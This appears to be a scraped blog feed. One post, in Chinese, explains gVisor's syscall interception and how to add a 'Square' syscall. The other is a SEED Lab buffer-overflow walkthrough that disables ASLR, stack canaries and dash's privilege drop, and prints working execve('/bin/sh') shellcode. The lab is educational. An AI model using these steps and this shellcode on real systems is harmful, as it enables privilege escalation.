<p>更多的信息请见官方关于<span class="exturl" data-url="aHR0cHM6Ly9ndmlzb3IuZGV2L2RvY3MvdXNlcl9ndWlkZS9kZWJ1Z2dpbmcv" title="https://gvisor.dev/docs/user_guide/debugging/">gVisor Debugging的文档<i class="fa fa-external-link"></i></span>。</p>
<h2 id="gVisor-Overview"><a href="#gVisor-Overview" class="headerlink" title="gVisor Overview"></a>gVisor Overview</h2><blockquote>
<p>gVisor是一个用Go编写的user-space kernel，它实现了很大一部分的Linux系统调用接口。 它在运行的应用程序和主机操作系统之间提供了额外的隔离层。</p>
</blockquote>
<blockquote>
<p>gVisor包含一个名为 <code>runsc</code> 的Open Container Initiative（OCI）runtime，可以轻松使用现有的容器工具。<code>runsc</code> runtime与Docker和Kubernetes集成，使得运行沙盒化(sandboxed)容器变得简单。</p>
</blockquote>
<blockquote>
<p>与现有的sandbox技术相比，gVisor采用了独特的容器沙盒化(sandboxing)方法，并进行了一系列不同的技术权衡，从而为<strong>容器安全</strong>领域提供了新的工具和思路。</p>
</blockquote>
<p>更多介绍参考<span class="exturl" data-url="aHR0cHM6Ly9ndmlzb3IuZGV2L2RvY3Mv" title="https://gvisor.dev/docs/">官方Doc<i class="fa fa-external-link"></i></span>。还有相关的架构(Architecture)介绍<span class="exturl" data-url="aHR0cHM6Ly9ndmlzb3IuZGV2L2RvY3MvYXJjaGl0ZWN0dXJlX2d1aWRlLw==" title="https://gvisor.dev/docs/architecture_guide/">参考此处<i class="fa fa-external-link"></i></span>。</p>
<h3 id="Sandbox"><a href="#Sandbox" class="headerlink" title="Sandbox"></a>Sandbox</h3><p>gVisor 当中有许多重要的概念，本文不能一一尽述，就介绍几个相关的最为重要的部分。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ndmlzb3IuZGV2L2RvY3MvYXJjaGl0ZWN0dXJlX2d1aWRlL292ZXJ2aWV3Lw==" title="https://gvisor.dev/docs/architecture_guide/overview/">gVisor sandbox<i class="fa fa-external-link"></i></span> 在运行的时候包含了<strong>许多进程</strong>，这些进程共同组成一个共享环境，在其中可以运行<strong>一个或多个</strong>容器。</p>
<p>每个 sandbox 都有其独立的实例(instance)</p>
<ul>
<li><strong>Sentry</strong>，运行容器的 <strong>user space kernel</strong>，负责直接和 APP 交互，它<strong>拦截并响应</strong>来自于 APP 的系统调用</li>
<li><strong>Gofer</strong>，为容器提供文件系统的访问</li>
</ul>
<p>具体的结构如下图所示</p>
<p><img src="/images/gvisorIndoor/Sentry-Gofer.png" alt=""></p>
<p>本文之后的内容会重点放在 APP 与 Sentry 之间的 system calls 以及 gVisor sandbox 和 Host Kernel 之间的 system calls 上。</p>
<h3 id="Sentry"><a href="#Sentry" class="headerlink" title="Sentry"></a>Sentry</h3><p><span class="exturl" data-url="aHR0cHM6Ly9ndmlzb3IuZGV2L2RvY3MvYXJjaGl0ZWN0dXJlX2d1aWRlL292ZXJ2aWV3Lw==" title="https://gvisor.dev/docs/architecture_guide/overview/">Sentry<i class="fa fa-external-link"></i></span> 是 gVisor 的最大的组件。 它可以被认为是一个 user-space OS kernel。 Sentry 实现了不受信任的应用程序(APP)所需的<strong>所有内核功能</strong>。 它实现了<strong>所有</strong>受支持的<u>系统调用</u>，<u>信号传递</u>，<u>内存管理</u>和<u>页面错误逻辑</u>，<u>线程模型</u>等。</p>
<p>当不受信任的应用程序(APP)进行<strong>系统调用</strong>时，当前使用的<span class="exturl" data-url="aHR0cHM6Ly9ndmlzb3IuZGV2L2RvY3MvYXJjaGl0ZWN0dXJlX2d1aWRlL292ZXJ2aWV3LyNwbGF0Zm9ybXM=" title="https://gvisor.dev/docs/architecture_guide/overview/#platforms">平台(Platform)<i class="fa fa-external-link"></i></span>会将<strong>调用重定向</strong>到 Sentry，后者将执行必要的工作来为其提供服务。 值得注意的是，Sentry <strong>不会简单地将系统调用传递给主机内核</strong>。 作为用户空间应用程序，Sentry将进行一些主机系统调用以支持其操作，但它不允许应用程序直接控制它所进行的系统调用。事实上，在 kvm platform 下，sentry 不会把未实现的 system call 传递给主机内核，而是<span class="exturl" data-url="aHR0cHM6Ly9ncm91cHMuZ29vZ2xlLmNvbS9kL21zZy9ndmlzb3ItdXNlcnMvQjhta2d3aUpGT1kvalU1QlItT3NCQUFK" title="https://groups.google.com/d/msg/gvisor-users/B8mkgwiJFOY/jU5BR-OsBAAJ">简单的报错<i class="fa fa-external-link"></i></span>。</p>
<p>超出sandbox（不是内部/proc文件，管道等）的文件系统操作将发送到<span class="exturl" data-url="aHR0cHM6Ly9ndmlzb3IuZGV2L2RvY3MvYXJjaGl0ZWN0dXJlX2d1aWRlL292ZXJ2aWV3LyNnb2Zlcg==" title="https://gvisor.dev/docs/architecture_guide/overview/#gofer">Gofer<i class="fa fa-external-link"></i></span>。</p>
<h2 id="gVisor-system-calls"><a href="#gVisor-system-calls" class="headerlink" title="gVisor system calls"></a>gVisor system calls</h2><p>gVisor 的系统调用分成两个部分来讲述，第一部分 System Call Implementation 介绍了 Linux 如何实现系统调用，以及 gVisor 是如何仿照 Linux 来做的。第二部分则利用 gVisor 设计实现系统调用的原理，自己设计并添加了一个新的系统调用，借此来熟悉 gVisor 具体的系统调用流程。</p>
<h3 id="System-Call-Implementation"><a href="#System-Call-Implementation" class="headerlink" title="System Call Implementation"></a>System Call Implementation</h3><h4 id="Linux-Implementation"><a href="#Linux-Implementation" class="headerlink" title="Linux Implementation"></a>Linux Implementation</h4><p>首先需要搞清楚的一点是，Linux 是怎么实现系统调用的。<span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzYwNDI4Ny8=" title="https://lwn.net/Articles/604287/">Anatomy of a system call, part 1<i class="fa fa-external-link"></i></span> 介绍了Linux实现系统调用的具体流程。</p>
<p>系统调用和普通的函数不同，被调用的代码放在内核里面。当 APP 进行系统调用的时候，需要有<strong>特定的指令</strong>，使得处理器进行<strong>ring 0</strong>(特权模式)的转换。同时系统调用不是由地址来标识，而是<strong>由系统调用号来标识</strong>的。</p>
<p>上文提到的那篇文章，以 <code>read()</code> 系统调用为例详细介绍了 Linux kernel 的的系统调用流程。这里有个重点需要指出，<code>system_call</code> 系统调用处理函数的地址写入寄存器 <strong>MSR_LSTAR (0xc0000082)</strong>，这是用于处理SYSCALL指令的x86_64特定于模型的寄存器，不同的硬件设备是不一样的。</p>
<p>系统调用的简要流程如下</p>
<p>user-space 的用户进程将系统调用号放入寄存器 <code>RAX</code>，然后其他参数放到具体的寄存器，之后运行 <code>SYSCALL</code> 指令。硬件完成切换 Ring 0，调用 MSR_LSTAR 寄存器指向地址的代码 <code>system_call</code>，寄存器值(之前的参数值)放入kernel Stack，根据 <code>RAX</code> 获取函数指针，然后最后调用具体的系统调用实现函数。这写过程都是由硬件完成的，而 <code>system_call</code> 的地址是在系统调用初始化的时候就放入寄存器当中的。</p>
<h4 id="gVisor-Implementation"><a href="#gVisor-Implementation" class="headerlink" title="gVisor Implementation"></a>gVisor Implementation</h4><p>根据 <span class="exturl" data-url="aHR0cHM6Ly9ncm91cHMuZ29vZ2xlLmNvbS9kL21zZy9ndmlzb3ItdXNlcnMvMTVGZmNDaWx1cG8vN2loMzV1UEhCQUFK" title="https://groups.google.com/d/msg/gvisor-users/15FfcCilupo/7ih35uPHBAAJ">gVisor 论坛当中的帖子<i class="fa fa-external-link"></i></span>，在 KVM 平台下，系统调用的拦截和普通的OS类似。当在 guest mode 运行程序的时候，KVM 把上文提到的 <code>MSR_LSTAR</code> 寄存器设置为一个 <a href="https://github.com/google/gvisor/blob/master/pkg/sentry/platform/ring0/entry_amd64.go#L23-L32" target="_blank" rel="noopener"><strong>system call handler</strong></a>，每次程序发生系统调用或者是 sentry 自己进行系统调用的时候，这个 <code>sysenter()</code> 函数都会执行。详细的在下一节当中有介绍。</p>
<h3 id="Add-a-System-Call-To-gVisor"><a href="#Add-a-System-Call-To-gVisor" class="headerlink" title="Add a System Call To gVisor"></a>Add a System Call To gVisor</h3><p>以下实验请在 <code>release-20190806.1</code> 版本上实践，不同的 gVisor 版本对于 syscall 的实现方式会有偏差。</p>
<h4 id="添加-syscall-的主要步骤"><a href="#添加-syscall-的主要步骤" class="headerlink" title="添加 syscall 的主要步骤"></a>添加 syscall 的主要步骤</h4><p>参考<span class="exturl" data-url="aHR0cHM6Ly9ncm91cHMuZ29vZ2xlLmNvbS9kL21zZy9ndmlzb3ItdXNlcnMvLV9JZ3RwUEhpaWMvTG9xbU10QXVCUUFK" title="https://groups.google.com/d/msg/gvisor-users/-_IgtpPHiic/LoqmMtAuBQAJ">我在gvisor论坛上面的Topic<i class="fa fa-external-link"></i></span>，在gVisor中添加一个系统调用主要分三步</p>
<ul>
<li>在<a href="https://github.com/google/gvisor/blob/fb996668e40031671e08d107e1a5307e813215f9/pkg/sentry/syscalls/linux/linux64.go#L48" target="_blank" rel="noopener"><code>pkg/sentry/syscalls/linux/linux64.go</code></a>文件当中的<code>var AMD64</code>变量当中添加调用函数名和系统调用号</li>
<li>在<code>pkg/sentry/syscalls/linux</code>目录下添加<code>×××.go</code>文件，在这个文件里定义调用函数</li>
<li>在<a href="https://github.com/google/gvisor/blob/fb996668e40031671e08d107e1a5307e813215f9/pkg/sentry/syscalls/linux/BUILD#L7" target="_blank" rel="noopener"><code>pkg/sentry/syscalls/linux/BUILD</code></a>文件当中添加构建项</li>
</ul>
<p>以上三步完成之后，重新编译gvisor就可以在Application当中进行系统调用(按照系统调用号)，调用我们刚刚定义的函数。</p>
<h4 id="gVisor-关于-redirect-syscall-的原理"><a href="#gVisor-关于-redirect-syscall-的原理" class="headerlink" title="gVisor 关于 redirect syscall 的原理"></a>gVisor 关于 redirect syscall 的原理</h4><p><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzYwNDI4Ny8=" title="https://lwn.net/Articles/604287/">Anatomy of a system call, part 1<i class="fa fa-external-link"></i></span> 介绍了Linux实现系统调用的具体流程。</p>
<p>和Linux实现系统调用类似，gVisor 也存在着这样的机制。</p>
<p>gVisor 在 sentry 当中实现系统调用，具体的架构如下(来自于<span class="exturl" data-url="aHR0cHM6Ly93ZW5ib3NoZW4ub3JnL3Bvc3RzLzIwMTgtMTItMDEtc2VjdGFpbmVyLmh0bWw=" title="https://wenboshen.org/posts/2018-12-01-sectainer.html">申文博老师的runc, gvisor, and kata container<i class="fa fa-external-link"></i></span>)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">          Application     --&gt; Guest Ring 3</span><br><span class="line">         ----------------</span><br><span class="line">          Sentry (ring0)  --&gt; Guest Ring 0</span><br><span class="line">GUEST</span><br><span class="line">-------------------------------------------</span><br><span class="line">HOST</span><br><span class="line">          Sentry (kvm)    --&gt; Host Ring 3</span><br><span class="line">         -------------</span><br><span class="line">          Host kernel     --&gt; Host Ring 0</span><br></pre></td></tr></table></figure>

<p><strong>Sentry</strong> 在初始化的时候，将系统调用函数 <a href="https://github.com/google/gvisor/blob/fb996668e40031671e08d107e1a5307e813215f9/pkg/sentry/platform/ring0/kernel_amd64.go#L243" target="_blank" rel="noopener"><code>sysenter()</code></a> 放入 <strong>MSR_LSTAR</strong> 寄存器当中，当 <strong>Application</strong> 发生系统调用的时候，机器会直接陷入 trap，然后自动调用存放在 <strong>MSR_LSTAR</strong> 寄存器当中的函数，即 <code>sysenter()</code>。</p>
<p>每次 <strong>Application</strong> 发生系统调用或者是 <strong>sentry</strong> 自己进行系统调用的时候，这个 <code>sysenter()</code> 函数都会执行。这个函数是用汇编代码来写的，主要做的事情就是在 <strong>context switch</strong> 的过程当中保存寄存器的值，然后根据 <strong>kernel space</strong> 里面的 <strong>syscall table</strong> 来进行跳转到具体的系统调用实现函数中去。</p>
<p><strong>sentry</strong> 当中的 <strong>kernel space</strong> 其实在 <strong>Host</strong> 看来是 <strong>user space</strong> 当中分配给 <strong>sentry</strong> 的其中一部分。</p>
<p>当添加一个系统调用的时候，需要做的就是编写调用函数，同时将系统调用函数名和调用号都添加到 <strong>syscall table</strong> 当中去。</p>
<h4 id="添加调用函数名和调用号"><a href="#添加调用函数名和调用号" class="headerlink" title="添加调用函数名和调用号"></a>添加调用函数名和调用号</h4><p>在<a href="https://github.com/google/gvisor/blob/fb996668e40031671e08d107e1a5307e813215f9/pkg/sentry/syscalls/linux/linux64.go#L48" target="_blank" rel="noopener"><code>pkg/sentry/syscalls/linux/linux64.go</code></a>文件当中的<code>var AMD64</code>变量当中添加调用函数名和系统调用号。</p>
<p>上文讲到的 <strong>syscall table</strong> 定义在 <code>var AMD64</code> 变量当中的 <code>Table</code> 属性下。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> AMD64 = &amp;kernel.SyscallTable&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    Table: <span class="keyword">map</span>[<span class="keyword">uintptr</span>]kernel.SyscallFn&#123;</span><br><span class="line">        <span class="number">0</span>:  Read,</span><br><span class="line">        <span class="number">1</span>:  Write,</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="number">400</span>: Square,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>添加新的系统调用的时候，形式应该和上述的调用一样，以<code>调用号: 调用函数名</code>的形式，如上述代码中的<code>400: Square</code>。</p>
<p>这一步相当于在调用表当中注册了新的调用函数。接下来就是定义这个新添加的调用函数。</p>
<h4 id="定义调用函数"><a href="#定义调用函数" class="headerlink" title="定义调用函数"></a>定义调用函数</h4><p>定义调用函数的目录是确定的，在 <code>pkg/sentry/syscalls/linux</code>。</p>
<p>在该目录新建一个<code>.go</code>文件，这里以之前添加的 <code>Square</code> 调用函数为例，在目录下新建一个名为<code>sys_square.go</code>的文件</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> linux</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"gvisor.googlesource.com/gvisor/pkg/sentry/arch"</span></span><br><span class="line">    <span class="string">"gvisor.googlesource.com/gvisor/pkg/sentry/kernel"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Square returns the square of arg[0]</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Square</span><span class="params">(t *kernel.Task, args arch.SyscallArguments)</span> <span class="params">(<span class="keyword">uintptr</span>, *kernel.SyscallControl, error)</span></span> &#123;</span><br><span class="line">    num := args[<span class="number">0</span>].Int()</span><br><span class="line">    num = num * num</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">uintptr</span>(num), <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>Square()</code>函数接受一个参数并返回它的平方。</p>
<p>注意这里的 <strong>package</strong> 和 <strong>import</strong> 部分必须一致。函数名要和之前注册的相对应。</p>
<h4 id="添加构建项"><a href="#添加构建项" class="headerlink" title="添加构建项"></a>添加构建项</h4><p>打开<a href="https://github.com/google/gvisor/blob/fb996668e40031671e08d107e1a5307e813215f9/pkg/sentry/syscalls/linux/BUILD#L7" target="_blank" rel="noopener"><code>pkg/sentry/syscalls/linux/BUILD</code></a>文件，添加新建的<code>sys_square.go</code>文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package(licenses &#x3D; [&quot;notice&quot;])</span><br><span class="line">load(&quot;&#x2F;&#x2F;tools&#x2F;go_stateify:defs.bzl&quot;, &quot;go_library&quot;)</span><br><span class="line">go_library(</span><br><span class="line">    name &#x3D; &quot;linux&quot;,</span><br><span class="line">    srcs &#x3D; [</span><br><span class="line">        &quot;error.go&quot;,</span><br><span class="line">        &quot;flags.go&quot;,</span><br><span class="line">        &quot;linux64.go&quot;,</span><br><span class="line">        &quot;timespec.go&quot;,</span><br><span class="line">        ...</span><br><span class="line">        &quot;sys_square.go&quot;     &lt;-------------- new</span><br><span class="line">    ],</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>重新 <strong>build</strong> gVisor。</p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuZmVuZ2JvaGVsbG8udG9wL2FyY2hpdmVzL2dvLWVudi1kb2NrZXI=" title="https://www.fengbohello.top/archives/go-env-docker">这篇文章<i class="fa fa-external-link"></i></span>，使用 <strong>docker</strong> 来构建 <strong>go</strong> 语言环境，生成可执行文件。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test-square.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"os"</span></span><br><span class="line">    <span class="string">"syscall"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> SQUARE = <span class="number">400</span> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    r1, _, errNo := syscall.RawSyscall(SQUARE, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> errNo != <span class="number">0</span> &#123; </span><br><span class="line">        fmt.Fprintf(os.Stderr, <span class="string">"ERROR: %d\n"</span>, errNo)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">"%d\n"</span>, r1) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个文件通过<code>syscall.RawSyscall(SQUARE, 5, 0, 0)</code>利用系统调用号来进行系统调用，这里用到的参数仅仅为第一个<code>5</code>。</p>
<p>将该程序编译之后得到可执行文件<code>test-square</code>，在 <strong>gVisor</strong> 当中运行它，得到如下输出</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@91071194a4c4:/code# ls</span><br><span class="line">test-square  test-square.go</span><br><span class="line">root@91071194a4c4:/code# ./test-square </span><br><span class="line">25</span><br></pre></td></tr></table></figure>

<p>输出为<code>5</code>的平方<code>25</code>。</p>
]]></content>
      <categories>
        <category>Container</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>gvisor</tag>
        <tag>system call</tag>
      </tags>
  </entry>
  <entry>
    <title>Stack Overflow In Ubuntu 18.04</title>
    <url>/2019/06/27/Stack-Overflow/</url>
    <content><![CDATA[<p>This article is writsten by Tianyu Zhou in May, 2019. Most of the technics are from the seed lab provided by Dr Wenliang Du on his websites, so remember to notice his copyright.</p>
<a id="more"></a>

<h3 id="Followed-the-Seed-Lab"><a href="#Followed-the-Seed-Lab" class="headerlink" title="Followed the Seed Lab"></a>Followed the <a href="http://www.cis.syr.edu/~wedu/seed/Labs_16.04/Software/Buffer_Overflow/" target="_blank" rel="noopener"><em>Seed Lab</em></a></h3><p>Copyright © Wenliang Du, Syracuse University</p>
<h3 id="get-root-previlege-in-X86-system"><a href="#get-root-previlege-in-X86-system" class="headerlink" title="get root previlege in X86 system"></a>get root previlege in X86 system</h3><p>Here we use the Ubuntu 18.04 64 bit for example.</p>
<p>At first, there are several rules of the runtime memory use when we call a function.</p>
<p>Unlike the global variables or static values, the local variables are stored on the <em>stack</em>, which is below the <em>return address</em>.</p>
<p>When we use some function without boundary checking, the <em>return address</em> can be <strong>overwritten</strong> and <strong>jump</strong> to somewhere else rather than the normal destination.</p>
<h4 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h4><p>There are several mechanisms in the systems that protects from <strong>Stack Overflow</strong>, at the beginning of this Lab, we will disable them to make things more easier.</p>
<h5 id="Address-Space-Randomization"><a href="#Address-Space-Randomization" class="headerlink" title="Address Space Randomization"></a>Address Space Randomization</h5><p>First of all, we will turn of the randomization of the address space, this mechanism is made to make the address more hard to guesss.</p>
<p><em>Ubuntu</em> and several other <em>Linux-based systems</em> uses <strong>address space ran-domization</strong> to randomize <em>the starting address of heap and stack</em>. This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of buffer-overflow attacks. In this lab, we disable this feature using the following command:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo sysctl -w kernel.randomize_va_space=0</span></span><br></pre></td></tr></table></figure>

<h5 id="The-StackGuard-Protection-Scheme"><a href="#The-StackGuard-Protection-Scheme" class="headerlink" title="The StackGuard Protection Scheme"></a>The StackGuard Protection Scheme</h5><p>The GCC compiler implements a security mechanism called <em>Stack-Guard</em> to prevent buffer overflows. In the presence of this protection, buffer overflow attacks will not work. We can disable this protection during the compilation using the-fno-stack-protectoroption.  </p>
<p>In the system security theorem, this mechanism calls the canary. Between the local variables and former frame pointer which $ebp points to, gcc compiler automatically add a piece of code, which is saved as the global variable in the heap at the runtime. When it is time for return, the program will first check the canary whether it equals to the global value stored in the heap. If not, the process will terminate. This mechanism is set up in default.</p>
<p>For example, to compile a program example.c with Stack-Guard disabled, we can do the following:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc -fno-stack-protector example.c</span></span><br></pre></td></tr></table></figure>

<h5 id="Non-Executable-Stack"><a href="#Non-Executable-Stack" class="headerlink" title="Non-Executable Stack"></a>Non-Executable Stack</h5><p><em>Ubuntu</em> used to allow executable stacks, but this has now changed:  the binary images of programs (and shared libraries) must declare whether they require executable stacks or not, i.e., they need to mark a field in the program header.</p>
<p>Kernel or dynamic linker uses this marking to decide whether to make the stack of this running program executable or non-executable.  This marking is done automatically by the recent versions of gcc, and by default, stacks are set to be <em>non-executable</em>. </p>
<p>To change that, use the following option when compiling programs:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> For executable stack</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gcc -z execstack -o <span class="built_in">test</span> test.c</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> For non-executable stack</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gcc -z noexecstack -o <span class="built_in">test</span> test.c</span></span><br></pre></td></tr></table></figure>

<p>In this lab, we will use the execstack option at first.</p>
<h5 id="Configuring-bin-sh"><a href="#Configuring-bin-sh" class="headerlink" title="Configuring /bin/sh"></a>Configuring /bin/sh</h5><p>In Ubuntu 18.04, the file <code>/bin/sh</code> is a link to the <code>/bin/dash</code>. The <em>dash shell</em> has a countermeasure that prevents itself from being executed in a Set-UID process.  Basically, if dash detects that it is executed in a Set-UID process, it immediately changes the effective user ID to the process’s real user ID, essentially dropping theprivilege. </p>
<p>Since  our  victim  program  is  a Set-UID program,  and our attack relies on running <code>/bin/sh</code>,  the countermeasure  in <code>/bin/dash</code> makes our attack more difficult. Therefore, we will link <code>/bin/sh</code> to another shell that does not have such a countermeasure (in later tasks, we will show that with a little bit more effort, the countermeasure in <code>/bin/dash</code> can be easily defeated). </p>
<p>At first we should install a shell program called <code>zsh</code> have installed a shell program called <code>zsh</code>. After that, we link <code>/bin/sh</code> to <code>zsh</code> :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install zsh</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo rm /bin/sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /bin/zsh /bin/sh</span></span><br></pre></td></tr></table></figure>

<h4 id="Runing-a-Shell-Code"><a href="#Runing-a-Shell-Code" class="headerlink" title="Runing a Shell Code"></a>Runing a Shell Code</h4><p>First, let&#39;s look at how shellcode work to get a root privilege. Here is a c file that execute the shell code <code>/bin/sh</code>.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// shell.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *name[<span class="number">2</span>];</span><br><span class="line">  	name[<span class="number">0</span>] = <span class="string">"/bin/sh"</span>;</span><br><span class="line">  	name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  	execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line"> 	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Remember that this code is using the x86 gcc lib, so if you want to complie on the 64 bit system, you have to use <code>-m32</code> option while use <code>gcc</code>. At the first time using this, it is necessary to install some lib.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">for</span> c file</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install gcc-multilib</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">for</span> c++ file</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install g++-multilib</span></span><br></pre></td></tr></table></figure>

<p>After install <code>multilib</code>, we can use the following instruction to compile and run the code.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc -m32 -o shell shell.c</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./shell</span></span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure>

<p>When we run the shell file, we actually execute the /bin/sh shell code, and enter to the shell interface. We can enter into the shell interface by another approach which run the code in the stack.</p>
<p>Here we create a file named <em>call_shellcode.c</em>, and this is its content.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* call_shellcode.c  */</span></span><br><span class="line"><span class="comment">/*A program that creates a file containing code for launching shell*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> code[] =</span><br><span class="line">  	<span class="string">"\x31\xc0"</span>             <span class="comment">/* xorl    %eax,%eax              */</span></span><br><span class="line">  	<span class="string">"\x50"</span>                 <span class="comment">/* pushl   %eax                   */</span></span><br><span class="line">  	<span class="string">"\x68"</span><span class="string">"//sh"</span>           <span class="comment">/* pushl   $0x68732f2f            */</span></span><br><span class="line">  	<span class="string">"\x68"</span><span class="string">"/bin"</span>           <span class="comment">/* pushl   $0x6e69622f            */</span></span><br><span class="line">  	<span class="string">"\x89\xe3"</span>             <span class="comment">/* movl    %esp,%ebx              */</span></span><br><span class="line">  	<span class="string">"\x50"</span>                 <span class="comment">/* pushl   %eax                   */</span></span><br><span class="line">  	<span class="string">"\x53"</span>                 <span class="comment">/* pushl   %ebx                   */</span></span><br><span class="line">  	<span class="string">"\x89\xe1"</span>             <span class="comment">/* movl    %esp,%ecx              */</span></span><br><span class="line">  	<span class="string">"\x99"</span>                 <span class="comment">/* cdq                            */</span></span><br><span class="line">  	<span class="string">"\xb0\x0b"</span>             <span class="comment">/* movb    $0x0b,%al              */</span></span><br><span class="line">  	<span class="string">"\xcd\x80"</span>             <span class="comment">/* int     $0x80                  */</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  	 <span class="keyword">char</span> buf[<span class="keyword">sizeof</span>(code)];</span><br><span class="line">  	 <span class="built_in">strcpy</span>(buf, code);</span><br><span class="line">  	 (*(<span class="keyword">void</span>(*)( ))code)( );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In this code, we change the variable <em>buf</em> into the pointer of a function. When the code runs to this line 25, the CPU actually run the code we put into the buf. We call this kind of code <em>shell code</em>, and if you want to view more like this, please visit <span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vc2hlbGxjb2Rlcw==" title="https://www.exploit-db.com/shellcodes">Exploit Database<i class="fa fa-external-link"></i></span>.</p>
<p>Again, we compile this code by gcc. Although we run the code on the stack, it&#39;s not necessary for us to add <code>-z execstack</code> option, maybe in the -m32 option, the execstack is default, but it&#39;s more appropriate to include the option to make sure the code could run.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc -m32 -z execstack -o call_shellcode call_shellcode.c</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./call_shellcode</span></span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure>

<p>After we run the code, we get shell again.</p>
<p>Here we take a short time to read the content inside the <code>code[]</code>.</p>
<p>At first, let&#39;s take a look at the purpose of this code, and the registers we have to focus on.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">"/bin/sh"</span>, argv, <span class="number">0</span>);</span><br><span class="line">           |       |    |</span><br><span class="line">         %ebx     %ecx  %edx</span><br><span class="line">		</span><br><span class="line">%eax -&gt; store variables</span><br><span class="line">%al  -&gt; part of %eax, to select the type of system call</span><br><span class="line">%esp -&gt; the <span class="built_in">stack</span> pionter</span><br></pre></td></tr></table></figure>

<p>The purpose of this code is to call the <code>execve</code> system call to start a <code>/bin/sh</code> shell.</p>
<p>Then we take a deep look at the code.</p>
